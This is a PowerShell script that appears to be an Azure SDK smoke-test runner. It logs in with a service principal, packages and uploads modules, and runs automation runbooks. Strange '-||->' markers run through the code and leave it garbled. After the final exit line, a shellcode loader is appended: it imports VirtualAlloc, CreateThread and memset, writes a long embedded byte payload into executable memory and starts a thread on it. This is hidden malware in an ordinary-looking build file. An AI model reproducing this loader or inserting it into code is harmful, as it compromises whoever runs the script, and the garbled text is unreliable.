
    
    
    
    
    
    
    
    
    
    


param (
    [Parameter(Mandatory = $true)]
    [string] $spPassword,
    [string] $modulesDir = '',
    [bool] $createPackages = $true,
    [bool] $uploadPackages = $true,
    [bool] $processRunbooks = $true,
    [bool] $waitForResults = $true
)

 -||-> . "$PSScriptRoot\Management\PackageGenerator.ps1" <-||- 
 -||-> . "$PSScriptRoot\Management\ModuleUploader.ps1" <-||- 
 -||-> . "$PSScriptRoot\Management\RunbookProcessor.ps1" <-||- 

 -||-> try {
     -||-> $srcPath = "$PSScriptRoot\..\..\src" <-||- 
     -||-> $projectList = @( -||-> 'Accounts', 'Compute', 'Resources', 'Storage', 'Websites', 'Network', 'Sql' <-||- ) <-||- 
     -||-> $testResourcesDir = "$PSScriptRoot\TestResources" <-||- 
     -||-> $packagingDir = "$PSScriptRoot\Package" <-||- 
     -||-> $helperModuleName = 'Smoke.Helper' <-||- 
     -||-> $testModuleName = 'Smoke.Tests' <-||- 
     -||-> $runbooksPath = "$PSScriptRoot\Runbooks" <-||- 
     -||-> $success = $false <-||- 

     -||-> $automation = @{
        ResourceGroupName =  -||-> 'azposjhautomation' <-||- ;
        AccountName =  -||-> 'azposhautomation' <-||- 
    } <-||- 

     -||-> $storage = @{
        ResourceGroupName =  -||-> 'transit2automation' <-||- ;
        AccountName =  -||-> 'transit2automation' <-||- ;
        ContainerName =  -||-> 'testsmodule' <-||- 
    } <-||- 

     -||-> $template = @{
        SubscriptionName =  -||-> 'Azure SDK Powershell Test' <-||- ;
        AutomationConnectionName =  -||-> 'AzureRunAsConnection' <-||- ;
        Path =  -||-> "$testResourcesDir\RunbookTemplate.ps1" <-||- 
    } <-||- 

     -||-> $signedModuleList = @( -||-> 'Az.Automation', 'Az.Compute','Az.Resources', 'Az.Storage', 'Az.Websites', 'Az.Network', 'Az.Sql' <-||- ) <-||- 
    
    
     -||-> $signedModules = @{
        Accounts =  -||-> @( -||-> 'Az.Accounts' <-||- ) <-||- ;
    } <-||- 
    
     -||-> $signedModules.Other =  -||-> $signedModuleList | Where-Object {  -||-> ( -||-> $signedModules.Accounts <-||- ) -inotcontains $_ <-||-  } <-||-  <-||- 

     -||-> Import-Module Az.Accounts <-||- 
     -||-> Import-Module Az.Storage <-||- 
     -||-> Import-Module Az.Automation <-||- 

    
    
     -||-> $password =  -||-> ConvertTo-SecureString -String $spPassword -AsPlainText -Force <-||-  <-||- 
     -||-> $creds =  -||-> New-Object -TypeName 'System.Management.Automation.PSCredential' -ArgumentList '512d9f44-dacc-4a72-8bab-3ff8362d14b7', $password <-||-  <-||- 
     -||-> Login-AzAccount -Credential $creds -ServicePrincipal -TenantId 72f988bf-86f1-41af-91ab-2d7cd011db47 -Subscription 'Azure SDK Infrastructure' -ErrorAction Stop <-||- 

     -||-> if( -||-> $createPackages <-||- ) {
         -||-> Write-Verbose '=== Create Packages ========================' <-||- 
         -||-> Create-HelperModule `
            -moduleDir $testResourcesDir `
            -moduleName $helperModuleName `
            -archiveDir $packagingDir <-||- 
         -||-> Create-SignedModules `
            -signedModules $signedModules `
            -modulesDir $modulesDir `
            -archiveDir $packagingDir <-||- 
         -||-> Create-SmokeTestModule `
            -srcPath $srcPath `
            -archiveDir $packagingDir `
            -moduleName $testModuleName `
            -projectList $projectList <-||- 
         -||-> Write-Verbose '=============================================' <-||- 
    } <-||- 

     -||-> if( -||-> $uploadPackages <-||- ) {
         -||-> Write-Verbose '=== Upload Modules ========================' <-||- 
         -||-> Remove-HelperModulesFromAutomationAccount `
            -automation $automation `
            -moduleNames $helperModuleName, $testModuleName <-||- 
         -||-> Upload-Modules `
            -automation $automation `
            -storage $storage `
            -signedModules $signedModules `
            -archiveDir $packagingDir <-||- 
             -||-> Write-Verbose '=============================================' <-||- 
    } <-||- 

     -||-> if( -||-> $processRunbooks <-||- ) {
         -||-> Write-Verbose '=== Process Runbooks ========================' <-||- 
         -||-> Create-Runbooks `
            -template $template `
            -srcPath $srcPath `
            -projectList $projectList `
            -outputPath $runbooksPath <-||- 
         -||-> $jobs =  -||-> Start-Runbooks `
            -automation $automation `
            -runbooksPath $runbooksPath <-||-  <-||- 
         -||-> if ( -||-> $waitForResults <-||- ) {
             -||-> $success =  -||-> Wait-RunbookResults `
                -automation $automation `
                -jobs $jobs <-||-  <-||- 
        } <-||- 
         -||-> Write-Verbose '=============================================' <-||- 
    } <-||- 

     -||-> Write-Verbose '=== All Done ========================' <-||- 
    
     -||-> if ( -||-> -not $success <-||- ) {
        exit  -||-> 1 <-||- 
    } <-||- 
} catch {
     -||-> Write-Host "Something went wrong: $_" -ForegroundColor Red <-||- 
     -||-> $_.ScriptStackTrace.Split([Environment]::NewLine) | Where-Object {  -||-> $_.Length -gt 0 <-||-  } | ForEach-Object {  -||-> Write-Verbose "`t$_" <-||-  } <-||- 
    exit  -||-> 1 <-||- 
} <-||- 

exit  -||-> 0 <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbd,0xd3,0xfe,0x81,0xdf,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x83,0xea,0xfc,0x03,0x6a,0xdc,0x1c,0x74,0x23,0x0a,0x62,0x77,0xdc,0xca,0x03,0xf1,0x39,0xfb,0x03,0x65,0x49,0xab,0xb3,0xed,0x1f,0x47,0x3f,0xa3,0x8b,0xdc,0x4d,0x6c,0xbb,0x55,0xfb,0x4a,0xf2,0x66,0x50,0xae,0x95,0xe4,0xab,0xe3,0x75,0xd5,0x63,0xf6,0x74,0x12,0x99,0xfb,0x25,0xcb,0xd5,0xae,0xd9,0x78,0xa3,0x72,0x51,0x32,0x25,0xf3,0x86,0x82,0x44,0xd2,0x18,0x99,0x1e,0xf4,0x9b,0x4e,0x2b,0xbd,0x83,0x93,0x16,0x77,0x3f,0x67,0xec,0x86,0xe9,0xb6,0x0d,0x24,0xd4,0x77,0xfc,0x34,0x10,0xbf,0x1f,0x43,0x68,0xbc,0xa2,0x54,0xaf,0xbf,0x78,0xd0,0x34,0x67,0x0a,0x42,0x91,0x96,0xdf,0x15,0x52,0x94,0x94,0x52,0x3c,0xb8,0x2b,0xb6,0x36,0xc4,0xa0,0x39,0x99,0x4d,0xf2,0x1d,0x3d,0x16,0xa0,0x3c,0x64,0xf2,0x07,0x40,0x76,0x5d,0xf7,0xe4,0xfc,0x73,0xec,0x94,0x5e,0x1b,0xc1,0x94,0x60,0xdb,0x4d,0xae,0x13,0xe9,0xd2,0x04,0xbc,0x41,0x9a,0x82,0x3b,0xa6,0xb1,0x73,0xd3,0x59,0x3a,0x84,0xfd,0x9d,0x6e,0xd4,0x95,0x34,0x0f,0xbf,0x65,0xb9,0xda,0x2a,0x63,0x2d,0x25,0x02,0x6a,0xeb,0xcd,0x51,0x6d,0xe9,0x07,0xdf,0x8b,0x5d,0x48,0x8f,0x03,0x1d,0x38,0x6f,0xf4,0xf5,0x52,0x60,0x2b,0xe5,0x5c,0xaa,0x44,0x8f,0xb2,0x03,0x3c,0x27,0x2a,0x0e,0xb6,0xd6,0xb3,0x84,0xb2,0xd8,0x38,0x2b,0x42,0x96,0xc8,0x46,0x50,0x4e,0x39,0x1d,0x0a,0xd8,0x46,0x8b,0x21,0xe4,0xd2,0x30,0xe0,0xb3,0x4a,0x3b,0xd5,0xf3,0xd4,0xc4,0x30,0x88,0xdd,0x50,0xfb,0xe6,0x21,0xb5,0xfb,0xf6,0x77,0xdf,0xfb,0x9e,0x2f,0xbb,0xaf,0xbb,0x2f,0x16,0xdc,0x10,0xba,0x99,0xb5,0xc5,0x6d,0xf2,0x3b,0x30,0x59,0x5d,0xc3,0x17,0x5b,0xa1,0x12,0x51,0x29,0xcb,0xa6 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



